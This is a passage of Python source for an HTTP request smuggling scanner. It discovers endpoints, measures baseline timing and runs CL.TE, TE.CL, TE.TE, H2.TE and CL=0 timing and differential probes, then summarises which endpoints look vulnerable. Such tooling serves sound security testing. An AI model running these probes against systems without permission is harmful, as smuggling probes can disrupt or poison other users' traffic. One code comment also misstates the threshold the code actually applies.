            f"[http_smuggle] CDN     : {fp.cdn_layer or 'unknown'} | "
            f"server: {fp.server_header or '?'}"
        )

        # ── Endpoint discovery ─────────────────────────────────────────────
        endpoints = _find_post_endpoints(session, self.target_url, self.timeout)
        print(f"[http_smuggle] endpoints: {endpoints}")

        # ── Baseline calibration ───────────────────────────────────────────
        # Use first endpoint for baseline (most representative)
        baseline_ms = _measure_baseline(
            self.host, self.port, self.tls, endpoints[0]
        )
        # Add 20% safety margin to avoid false positives on slow targets
        effective_threshold = max(
            _TIMING_THRESHOLD_MS,
            baseline_ms * 3,
        )
        print(f"[http_smuggle] baseline : {baseline_ms:.0f}ms | threshold: {effective_threshold:.0f}ms")

        all_results: List[SmuggleResult] = []
        lock = threading.Lock()

        for ep_path in endpoints:
            state = ScanState(
                target_url=self.target_url,
                host=self.host,
                port=self.port,
                tls=self.tls,
                path=ep_path,
                fingerprint=fp,
            )

            print(f"[http_smuggle] probing : {ep_path}")

            probe_tasks = []

            # ── CL.TE timing ───────────────────────────────────────────────
            if not self.skip_timing:
                probe_tasks.append(("timing", "CL.TE", "clte-timing", "critical",
                    "CL.TE timing: CL+1 stall",
                    _build_clte_timing(self.host, ep_path, "__CANARY__"),
                ))
                probe_tasks.append(("timing", "TE.CL", "tecl-timing", "critical",
                    "TE.CL timing: unterminated chunk stall",
                    _build_tecl_timing(self.host, ep_path, "__CANARY__"),
                ))

            # ── CL.TE differential ─────────────────────────────────────────
            if not self.skip_differential:
                probe_tasks.append(("differential_clte", "CL.TE", "clte-differential", "critical",
                    "CL.TE differential: GPOST prefix",
                    _build_clte_differential(self.host, ep_path, "__CANARY__"),
                ))
                probe_tasks.append(("differential_tecl", "TE.CL", "tecl-differential", "critical",
                    "TE.CL differential: POST prefix",
                    _build_tecl_differential(self.host, ep_path, "__CANARY__"),
                ))

            # Run timing + single-request probes in parallel
            def _run_task(task):
                ttype, variant, label, severity, desc, payload = task
                if ttype == "timing":
                    return _run_timing_probe(
                        state, label, variant, severity, desc,
                        payload, baseline_ms, self.rate_delay,
                    )
                elif ttype == "differential_clte":
                    followup = _build_normal_get(self.host, ep_path, "__CANARY__")
                    return _run_differential_probe(
                        state, label, variant, severity, desc,
                        payload, followup, self.rate_delay,
                    )
                elif ttype == "differential_tecl":
                    followup = _build_normal_get(self.host, ep_path, "__CANARY__")
                    return _run_differential_probe(
                        state, label, variant, severity, desc,
                        payload, followup, self.rate_delay,
                    )
                return None

            with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
                futures = [ex.submit(_run_task, t) for t in probe_tasks]
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        with lock:
                            all_results.append(r)
                        if r.vulnerable:
                            print(
                                f"  [VULN][{r.variant}][{r.technique.upper():<13}] "
                                f"{r.label} @ {r.endpoint} | {r.evidence[:60]}"
                            )

            # ── TE.TE obfuscation (sequential — many variants) ─────────────
            tete_results = _run_tete_obfusc_probes(state, baseline_ms, self.rate_delay)
            with lock:
                all_results.extend(tete_results)
            for r in tete_results:
                if r.vulnerable:
                    print(f"  [VULN][TE.TE][obfuscation ] {r.label} @ {r.endpoint} | {r.evidence[:60]}")

            # ── H2.TE ──────────────────────────────────────────────────────
            h2_result = _run_h2te_probe(state, self.rate_delay)
            with lock:
                all_results.append(h2_result)
            if h2_result.vulnerable:
                print(f"  [VULN][H2.TE][header_inject] {h2_result.label} @ {h2_result.endpoint}")

            # ── CL=0 + TE ──────────────────────────────────────────────────
            cl0_result = _run_cl_zero_te_probe(state, baseline_ms, self.rate_delay)
            with lock:
                all_results.append(cl0_result)
            if cl0_result.vulnerable:
                print(f"  [VULN][CL.TE][cl-zero-te  ] {cl0_result.label} @ {cl0_result.endpoint}")

        # ── Post-process ───────────────────────────────────────────────────
        all_results = _dedup_sort(all_results)
        confirmed   = [r for r in all_results if r.vulnerable]

        variant_counts: Dict[str, int] = {}
        technique_counts: Dict[str, int] = {}
        for r in confirmed:
            variant_counts[r.variant]     = variant_counts.get(r.variant, 0) + 1
            technique_counts[r.technique] = technique_counts.get(r.technique, 0) + 1

        print(
            f"[http_smuggle] done | "
            f"confirmed={len(confirmed)} / {len(all_results)} probes"
        )

        return {
            "target":           self.target_url,
            "cdn_layer":        fp.cdn_layer,
            "server":           fp.server_header,
            "baseline_ms":      round(baseline_ms, 1),
            "endpoints_tested": endpoints,
            "total_probes":     len(all_results),
            "vulnerabilities":  len(confirmed),
            "variant_summary":  variant_counts,
            "technique_summary":technique_counts,
            "fingerprint": {
                "server":           fp.server_header,
                "via":              fp.via_header,
                "cdn_layer":        fp.cdn_layer,
                "supports_chunked": fp.supports_chunked,
                "connection_close": fp.connection_close,
            },
            "results": [
                {
                    "variant":               r.variant,
                    "technique":             r.technique,
                    "label":                 r.label,
                    "severity":              r.severity,
                    "endpoint":              r.endpoint,
                    "baseline_ms":           r.baseline_ms,
                    "probe_ms":              r.probe_ms,
                    "timing_delta_ms":       r.timing_delta_ms,
                    "timing_anomaly":        r.timing_anomaly,
                    "differential_status":   r.differential_status,
                    "differential_body":     r.differential_body,
                    "differential_anomaly":  r.differential_anomaly,
                    "vulnerable":            r.vulnerable,
                    "confidence":            r.confidence,
                    "evidence":              r.evidence,
                }
                for r in all_results
            ],
        }